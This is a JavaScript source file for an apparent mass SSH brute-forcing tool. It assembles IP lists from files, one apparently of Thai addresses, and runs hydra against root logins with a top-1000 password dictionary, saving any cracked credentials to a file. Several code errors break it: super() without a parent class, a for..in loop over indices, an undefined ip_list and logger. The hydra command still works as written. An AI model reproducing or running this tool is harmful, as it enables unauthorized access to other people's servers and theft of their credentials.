const fs = require("fs");
const util = require('util');
const exec = util.promisify(require('child_process').exec);

class SSH{
	/*
		*	
		*	
	*/
	constructor(out_file){
		super(`${__dirname}/../dict/taiguo_ip.txt`,22)
		this.out_file = out_file;//__dirname + "/../runtime/user-pass.txt"
		this.brute_command = `hydra -o ${this.out_file} -l root -P ${__dirname}/../dict/top1000.txt -M ${__dirname}/../runtime/ip_${this.port}.txt ssh`;

		this.ip_list = new Set();

	}

	run(){
		
	}

	async getIpList(){
		let all_ips = new Array();
		let files = fs.readdirSync(__dirname + "/../runtime/available-ip");
		for(let file in files){
			let ips = fs.readFileSync(file);
			let ip_array = ips.split("\n");
			all_ips = all_ips.concat(ip_array);
		}
		this.ip_list = new Set(all_ips);
		for(let ip of ip_list){
			fs.writeFileSync(__dirname + `/../runtime/ip_${this.port}.txt`,ip,{flag:"a"});
		}
		this.log.info("获取ip列表完成");
		return true;
	}

	async bruteIp(){
		await exec(this.brute_command)
	}

}
